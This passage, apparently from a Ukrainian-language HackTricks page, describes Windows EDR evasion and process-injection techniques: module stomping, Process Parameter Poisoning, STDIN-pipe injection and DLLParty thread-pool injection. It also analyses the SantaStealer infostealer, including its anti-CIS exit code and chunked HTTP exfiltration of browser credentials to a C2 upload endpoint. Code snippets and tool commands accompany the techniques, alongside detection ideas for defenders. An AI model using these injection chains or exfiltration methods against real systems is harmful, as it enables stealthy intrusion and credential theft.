- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати сигнал про початок і заблокуватися.
- Призупиніть main thread перед відновленням TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити проміжок гонки, у якому сканер може виявити частково відновлений стек.

Це замінює сигнатуру `CreateTimerQueueTimer` + `NtContinue` на сигнатуру helper-thread/APC, зберігаючи ті самі цілі RC4 masking і stack spoofing.

Додаткові ідеї для виявлення
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` безпосередньо перед sleep, waits або APC dispatch.
- `GetThreadContext`/`SetThreadContext` навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, після якого відбуваються прямі записи в межі стека TEB/TIB поточного потоку.
- Ланцюжки `NtQueueApcThread`/`NtAlertResumeThread`, що непрямо викликають `SystemFunction032`, `VirtualProtect` або helpers для відновлення дозволів секцій.
- Повторне використання коротких сигнатур gadgets, як-от `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині підписаних модулів.


## Precision Module Stomping

Module stomping виконує payloads із **секції `.text` DLL, уже відображеної в цільовому процесі**, замість виділення очевидної приватної executable memory або завантаження нової sacrificial DLL. Для перезапису слід вибирати **завантажений disk-backed image**, code space якого може вмістити payload, не пошкодивши шляхи виконання, які ще потрібні процесу.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір цілі

Наївний stomping поширених модулів, як-от `uxtheme.dll` або `comctl32.dll`, ненадійний: DLL може бути не завантажена у віддалений процес, а надто мала code region призведе до аварійного завершення процесу. Надійніший робочий процес:

1. Перелічіть модулі цільового процесу та залиште **список включення лише з назв** уже завантажених DLL.
2. Спершу зберіть payload і зафіксуйте його **точний розмір у байтах**.
3. Перевірте кандидатні DLL на диску й порівняйте розмір PE section **`.text` `Misc_VirtualSize`** із розміром payload. Це важливіше за розмір файла, оскільки відображає розмір executable section **після відображення в пам’ять**.
4. Розберіть **Export Address Table (EAT)** і виберіть RVA експортованої функції як початкове зміщення для stomp.
5. Оцініть **радіус ураження**: якщо payload перевищує межу вибраної функції, він перезапише сусідні exports, розміщені після неї в пам’яті.

Типові helpers для розвідки/вибору, що трапляються на практиці:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Операційні примітки
- Надавайте перевагу DLL, **які вже завантажені** у віддалений процес, щоб уникнути телеметрії `LoadLibrary`/неочікуваного завантаження образів.
- Надавайте перевагу експорту, який цільова програма виконує рідко; інакше звичайні шляхи виконання коду можуть звернутися до перезаписаних байтів до або після створення потоку.
- Для великих імплантів часто потрібно замінити вбудовування shellcode як рядкового літерала на **масив байтів/ініціалізатор у фігурних дужках**, щоб у вихідному коді інжектора було правильно представлено весь буфер.

Ідеї для виявлення
- Віддалений запис у **виконувані сторінки, прив'язані до образу** (`MEM_IMAGE`, `PAGE_EXECUTE*`), замість поширеніших приватних розподілів RWX/RX.
- Точки входу експорту, байти яких у пам'яті більше не збігаються з файлом на диску.
- Віддалені потоки або перемикання контексту, які починають виконання всередині експорту легітимної DLL, перші байти якого нещодавно змінили.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory`, спрямовані на сторінки `.text` DLL, за якими створюється потік.

## Отруєння параметрів процесу (P3)

Отруєння параметрів процесу (P3) — це техніка **ін'єкції в процес / обходу EDR**, яка уникає класичного шляху віддаленого запису (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений цільовий процес вона використовує те, що Windows **копіює вибрані параметри запуску `CreateProcessW` у дочірній процес** і зберігає їх у `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Носії даних, які можна отруїти та які копіює `CreateProcessW`

Корисні носії:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження носіїв:

- `lpCommandLine` має вказувати на **пам'ять, доступну для запису**, для `CreateProcessW`; його довжина обмежена **32 767 символами Unicode**, включно з нульовим термінатором.
- `lpEnvironment` має бути блоком середовища Unicode з послідовністю рядків `NAME=VALUE\0`, завершених додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому відповідність `ShellInfo` слід вважати деталлю реалізації, а не стабільною документованою угодою.

Так звичайне створення процесу стає **примітивом передавання payload**. Оператор створює дочірній процес із даними запуску під контролем зловмисника, а Windows виконує копіювання між процесами.

### Потік віддаленого пошуку без API віддаленого запису

Після створення дочірнього процесу знайдіть скопійований буфер за допомогою **примітивів лише для читання**:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати віддалений `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний вказівник:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Мінімальний потік:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не є виконуваною. Поширений ланцюжок P3:

1. Створити процес звичайним способом (не призупиненим)
2. Зробити вибрану сторінку параметрів виконуваною за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати дескриптор головного потоку, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних сценаріїв перехоплення потоку, для цього **не потрібні** `SuspendThread` / `ResumeThread`; контекст можна змінити безпосередньо через повернутий дескриптор головного потоку.

Це дає змогу уникнути кількох API, за якими часто стежать для виявлення ін’єкцій:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження нульових байтів і поетапний shellcode

Усі три носії містять **рядкові або схожі на рядкові дані**, тому необроблене навантаження з `0x00` обрізається під час передавання. Практичний обхідний шлях — **перший етап без нульових байтів**, який відновлює константи під час виконання, а потім завантажує довільний другий етап.

Простий шаблон — синтез констант на основі XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Це дає змогу першому етапу створювати stack strings, аргументи API, шляхи до DLL або завантажувач shellcode другого етапу, не вбудовуючи нульові байти в передаваний параметр.

### Виклики API зі стеку на першому етапі

Коли першому етапу потрібно викликати API, як-от `LoadLibraryA`, він може:

- помістити рядок/буфер у стек цільового процесу
- зарезервувати **32-байтовий shadow space x64**
- встановити `RCX`, `RDX`, `R8`, `R9` у константи або вказівники відносно `RSP`
- зберігати **16-байтове вирівнювання** `RSP` перед викликом

Потім другий етап можна скопіювати зі стеку до виділеної області `PAGE_READWRITE`, змінити її захист на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і перейти до неї, уникаючи прямого виділення RWX.

### Ідеї для виявлення

Автори згадують такі перспективні напрямки пошуку:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, що надають **сторінкам параметрів процесу права на виконання**
- за цією зміною захисту йдуть `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Примітки

- P3 — це **трюк для передавання даних між процесами**, а не самостійний примітив виконання: скопійованому параметру все ще потрібно надати права на виконання та перенаправити виконання.
- Автори розглядали `RtlCreateProcessReflection` / Dirty Vanity, але відмовилися від нього, оскільки він внутрішньо задіює підозрілі примітиви, як-от `NtWriteVirtualMemory` і `NtCreateThreadEx`.

Щоб дізнатися, як доставити payload в **наявний** процес Windows через описи потоків, а потім перехопити адресу повернення потоку, що очікує, див. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Ін’єкція через консольний STDIN pipe

Інтерактивний дочірній процес консолі також можна використати як **примітив передавання payload**. Інжектор перенаправляє стандартний ввід дочірнього процесу до pipe і надсилає маркер, а за ним — shellcode. Після того як консольна програма зчитує дані у власну приватну пам’ять, інжектор знаходить цей буфер, надає йому права на виконання та перенаправляє до нього дочірній потік. Це дає змогу уникнути `VirtualAllocEx` і `WriteProcessMemory`, але все одно є ін’єкцією в процес, а не універсальним обходом EDR.<sup>[[41]](#references)</sup>

Попри опис як «named-pipe», у референсній реалізації викликається `CreatePipe`, який створює **анонімний pipe**. Windows реалізує анонімні pipes за допомогою внутрішніх об’єктів pipe з унікальними іменами, але PoC не вибирає шлях `\\.\pipe\<name>` і не викликає `CreateNamedPipe`. Він створює успадковувані дескриптори з дескриптором безпеки за замовчуванням, поміщає дескриптор читання в `STARTUPINFO.hStdInput`, задає `STARTF_USESTDHANDLES` і запускає новий дочірній процес із дозволеним успадкуванням дескрипторів. Отже, цей PoC запускає вказаний виконуваний файл консолі, а не приєднує свій pipe до наявного процесу.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Типовий робочий процес

Реалізація використовує такий ланцюжок:<sup>[[41]](#references)</sup>

1. Створити пари анонімних pipes для `STDIN` і `STDOUT` дочірнього процесу. Вимкнути успадкування для двох дескрипторів на стороні батьківського процесу та закрити в батьківському процесі дублікати дескрипторів на стороні дочірнього після створення процесу.
2. Запустити інтерактивний виконуваний файл, як-от `netsh.exe` або `nslookup.exe`, з `CREATE_NEW_CONSOLE`. Дочірній процес успадкує перенаправлені стандартні дескриптори.
3. Надіслати весь бінарний масив `rawData` за допомогою `WriteFile` через дескриптор `STDIN` на стороні батьківського процесу. Консольна програма споживає байти й залишає копію в одній зі своїх приватних committed-областей.
4. Переглянути адресний простір дочірнього процесу за допомогою `VirtualQueryEx`, зчитати кандидатні області `MEM_PRIVATE` за допомогою `ReadProcessMemory` і знайти маркер на початку `rawData`.
5. Змінити захист знайденого буфера на `PAGE_EXECUTE_READWRITE` за допомогою `VirtualProtectEx`.
6. Знайти основний потік, призупинити його, встановити `RIP` у `found_address + 0x19` за допомогою `NtSetContextThread` і відновити його виконання.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Надана реалізація призначена лише для x64: вона змінює `CONTEXT.Rip`, а вбудований payload — це x64 shellcode. `rawData` починається з маркера завдовжки 25 байтів, тому виконувані байти починаються зі шістнадцяткового зміщення `0x19`. Замінюючи payload, збережіть цю структуру або узгоджено оновіть маркер, вектор пошуку, розмір масиву та зміщення виконання. У коментарях до коду також вказано `0x0A`, `0x0D` і `0x1A` як bad characters. Цей процес не змінює токен або привілеї дочірнього процесу.<sup>[[41]](#references)</sup>

Приклади створення невеликих native helper-ів і компіляції payload див. у розділі [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Ін’єкція DLL через callback пулу потоків без shellcode (DLLParty)

DLLParty адаптує ін’єкцію в пул потоків у стилі PoolParty, щоб змусити наявний робочий потік цільового процесу викликати `LoadLibraryA`, а не виконувати ін’єктований callback stub. Примітивом диспетчеризації є `TP_DIRECT`, поставлений у чергу порту завершення вводу-виводу пулу цільового процесу. Цей метод не обходить дозволи процесу: PoC викликає `OpenProcess(PROCESS_ALL_ACCESS)` і потребує доступу на читання/запис до пам’яті цільового процесу, а також можливості дублювати handles фабрики робочих потоків і порту завершення.<sup>[[46]](#references)[[47]](#references)</sup>

У Windows x64 робочий потік передає в `RCX`, першому аргументі callback-функції, вказівник на `TP_CALLBACK_INSTANCE`, розміщений у стеку. `LoadLibraryA` інтерпретує той самий вказівник як `LPCSTR`. На перевіреному шляху `TppWorkerThread` формує вказівник за адресою `RSP+0x178`, а перший звичайний запис у цей об’єкт виконує за адресою `RSP+0x1d0`. Тому шлях до DLL із завершальним нульовим символом, який уміщується в цей префікс завдовжки 0x58 байтів, може розташовуватися на початку екземпляра, не перезаписуючись до диспетчеризації. Це спостереження стосується конкретної збірки, а не є документованою гарантією ABI Windows.<sup>[[46]](#references)[[47]](#references)</sup>

Довідковий процес такий:<sup>[[46]](#references)[[47]](#references)</sup>

1. Перелічіть handles цільового процесу за допомогою `NtQuerySystemInformation(SystemHandleInformation)` і визначте `TpWorkerFactory`, запитавши типи об’єктів. Дублюйте handle фабрики робочих потоків і запитайте `WorkerFactoryBasicInformation`; `StartParameter` містить адресу віддаленого `TP_POOL`. Пропускайте фабрики, у яких `TotalWorkerCount == 0`.
2. Прочитайте `TP_POOL.CompletionPort` і пройдіть приватний список робочих потоків пулу. У перевіреній збірці Windows 10 19045 x64 (`ntdll.dll 10.0.19041.4842`) його голова розташована за адресою `pool+0x60`; кожне посилання — за адресою `worker+0x10`, тому слот екземпляра callback за адресою `worker+0x38` відповідає `link+0x28`. PoC перевіряє вирівнювання вказівників, взаємність посилань, належність до пулу, ненульові ідентифікатори потоків, повторювані вузли та незмінність голови списку.
3. Запишіть шлях до DLL у **кожен** виявлений слот робочого потоку, оскільки поставлене в чергу завершення може обробити будь-який робочий потік. Розмістіть `TP_DIRECT` із `Callback = LoadLibraryA` у доступній для запису пам’яті цільового процесу. PoC використовує `last_slot-0x500` у стеку робочого потоку замість `VirtualAllocEx`; це зміщення визначено експериментально, і воно не повинно перетинатися з активними даними стека.
4. Дублюйте handle порту завершення цільового процесу й викличте `ZwSetIoCompletion(port, remote_direct, 0, 0, 0)`. Адреса віддаленого `TP_DIRECT` є ключем завершення. Наявний робочий потік викликає `LoadLibraryA` з перезаписаним вказівником екземпляра callback, завантажуючи DLL, доступну цільовому процесу.

PoC приймає PID цільового процесу (`DLLParty.exe <target_pid>`) і використовує жорстко заданий шлях до DLL у `DLLParty.cpp`; перед збиранням x64 executable вкажіть шлях, доступний цільовому процесу. Також він використовує адресу `LoadLibraryA` із власного процесу як віддалений callback, припускаючи, що ця адреса дійсна в цільовому процесі. Код не перевіряє довжину шляху щодо префікса 0x58 байтів і не перевіряє, чи обхід списку робочих потоків знайшов слот, перш ніж звертатися до останнього елемента. Повторно перевірте приватні зміщення, структуру стека й доступний для запису простір для цільової збірки. Відмова від `CreateRemoteThreadEx`, shellcode і `VirtualAllocEx` не усуває міжпроцесний запис або телеметрію завантаження DLL.<sup>[[46]](#references)[[47]](#references)</sup>

## Тактики SantaStealer для безфайлового ухилення та викрадення облікових даних

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні info-stealer-и поєднують обхід AV, протидію аналізу та доступ до облікових даних в одному процесі.<sup>[[24]](#references)</sup>

### Перевірка розкладки клавіатури та затримка в sandbox

- Прапорець конфігурації (`anti_cis`) перелічує встановлені розкладки клавіатури за допомогою `GetKeyboardLayoutList`. Якщо виявлено кириличну розкладку, зразок створює порожній маркер `CIS` і завершує роботу до запуску stealers, гарантуючи, що він не активується в регіонах, які виключає, але залишаючи артефакт для пошуку.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Багаторівнева логіка `check_antivm`

- Варіант A перебирає список процесів, хешує кожну назву за допомогою власної ковзної контрольної суми та порівнює результат із вбудованими списками для debugger-ів і sandbox-середовищ; він також обчислює контрольну суму для імені комп’ютера та перевіряє робочі каталоги, як-от `C:\analysis`.
- Варіант B перевіряє системні властивості (мінімальну кількість процесів, недавній час роботи системи), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і вимірює час до та після затримок, щоб помітити покрокове виконання. За будь-якого збігу виконання переривається до запуску модулів.

### Безфайловий helper і подвійне reflective loading із ChaCha20

- Основна DLL/EXE містить Chromium helper для збору облікових даних, який або записується на диск, або вручну відображається в пам’яті; у безфайловому режимі він самостійно розв’язує імпорти й релокації, тож файли helper не створюються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану за допомогою ChaCha20 (два ключі по 32 байти та 12-байтові nonce). Після обох проходів він виконує reflective loading blob (без `LoadLibrary`) і викликає експорти `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Процедури ChromElevator використовують reflective process hollowing через direct syscall для ін’єкції в активний браузер Chromium, успадковують ключі AppBound Encryption і розшифровують паролі, cookie та дані кредитних карток безпосередньо з баз даних SQLite, попри посилений захист ABE.

### Модульний збір у пам’яті та передавання даних через HTTP частинами

- `create_memory_based_log` перебирає глобальну таблицю вказівників на функції `memory_generators` і створює по одному потоку для кожного ввімкненого модуля (Telegram, Discord, Steam, знімки екрана, документи, розширення браузера тощо). Кожен потік записує результати у спільні буфери та повідомляє кількість файлів після очікування завершення приблизно 45 секунд.
- Після завершення всі дані архівуються за допомогою статично скомпонованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` чекає 15 секунд і передає архів частинами по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи boundary браузерного `multipart/form-data` (`----WebKitFormBoundary***`). До кожної частини додаються `User-Agent: upload`, `auth: <build_id>` і, за наявності, `w: <campaign_tag>`. В останній частині додається `complete: true`, щоб C2 знав, що повторне складання завершено.

## References

- [1] [Advanced Evasion Tradecraft: точне підмінювання модулів](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – блог](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Стек викликів: більше жодних поблажок для malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – документація](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – приклад](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – приклад](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC для підробки стека викликів](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Новий ланцюжок зараження та обфускація на основі ConfuserEx у викрадачі DarkCloud](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Чи варто довіряти zero trust? Обхід перевірок стану пристрою Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – До ToolShell: дослідження попередніх ransomware-операцій Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: зловживання переспрямованими експортами](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Перелік переспрямованих експортів Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Порядок пошуку бібліотек DLL](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Безпека процесів і права доступу](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Довідник EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Засіб запуску CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Протидія EDR за допомогою захищених процесів PPL](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Як обійти захист Windows Defender за допомогою перенаправлення папки](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Довідник команд mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – За чистою завісою: від RAT до builder-а й розробника](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer уже в дорозі: новий амбітний викрадач даних](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Розшифрування Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: протидія malware на Node.js за допомогою трасування API](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Спляча красуня: приспати Adaptix за допомогою Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Отруєння параметрів процесу](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Спляча красуня II: CFG, CET і підробка стека](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Обфускація сну Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Приховування Dotnet ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Зловживання Chrome Remote Desktop під час Red Team операцій: практичний посібник](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: перетворення драйвера відновлення Defender на примітив для операцій у ядрі](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Супровідний код MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: створення функцій із самоприховуванням за допомогою LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – вихідний код InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – Функція CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn – Створення дочірнього процесу з перенаправленими потоками вводу й виводу](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian – GhostPack Necromancy: відтворення інструментів C# за допомогою WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge – Компіляція проєктів C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Підтвердження концепції та вихідний код DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — зловживання внутрішніми механізмами пулу потоків для ін’єкції DLL без shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Набір даних для тестування EMBER2024 та інструменти thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Використання EMBER2024 для оцінювання імплантів Red Team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Обхід виявлення на основі машинного навчання](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Фреймворк завантаження .NET на основі XAML NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Перелік AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Метод IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
- [54] [Zscaler ThreatLabz – Технічний аналіз 2CLoader](https://zscaler.com/blogs/security-research/2cloader-new-malware-loader-delivering-vidar-and-remus)
{{#include ../banners/hacktricks-training.md}}
